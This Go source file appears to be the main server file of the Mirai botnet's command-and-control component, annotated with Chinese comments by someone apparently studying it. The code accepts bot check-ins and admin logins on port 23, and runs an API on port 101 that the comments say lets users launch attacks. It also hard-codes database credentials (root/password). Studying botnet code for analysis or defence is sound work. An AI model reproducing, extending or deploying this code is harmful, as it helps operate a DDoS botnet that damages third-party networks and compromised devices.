package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"

var clientList *ClientList = NewClientList()   //client管理   clientList.go
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)  //创建数据库

func main() {
    tel, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println(err)
        return
    }

    api, err := net.Listen("tcp", "0.0.0.0:101")
    if err != nil {
        fmt.Println(err)
        return
    }

    go func() {  //一个线程去监听101端口
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {  //主线程监听23端口 
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)  
    }

    fmt.Println("Stopped accepting clients")
}




func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)  //这是读取32字节？
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {  //bot上线
        if buf[3] > 0 {  //00 00 00 01
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)  //读取一个字节，string_len
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0]) //读取string_len个字节，为source
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()  //handle方法，里面一个死循环，类似echo服务器
        } else {  //00 00 00 00 
            NewBot(conn, buf[3], "").Handle()  //这个应该一直调不到
        }
    } else {
        NewAdmin(conn).Handle()  //管理员登录
    }
}



func apiHandler(conn net.Conn) {
    defer conn.Close()

    NewApi(conn).Handle()   //101端口的连接，给普通用户发动攻击等
}



func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
